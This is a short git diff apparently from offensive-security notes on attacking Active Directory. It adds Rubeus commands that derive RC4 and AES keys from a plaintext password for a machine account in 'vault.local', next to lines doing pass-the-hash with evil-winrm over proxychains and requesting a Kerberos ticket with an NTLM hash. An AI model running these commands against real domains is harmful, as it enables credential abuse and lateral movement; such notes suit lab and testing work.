@@ -2447,6 +2447,12 @@ proxychains evil-winrm -i 172.16.83.152 -u sqlsvc -H '1ef8ec7a4e862ed968d4d335af
 Meterpreter
 
 ```
+# get rc4
+> invoke-rubeus -command "hash /password:Summer2018!"
+
+# get aes
+> invoke-rubeus -command "hash /password:Summer2018! /user:fs-thelikes$ /domain:vault.local"
+
 # request tgt
 > invoke-rubeus -command "asktgt /user:sqladm /rc4:1ef8ec7a4e862ed968d4d335afb77215"
 
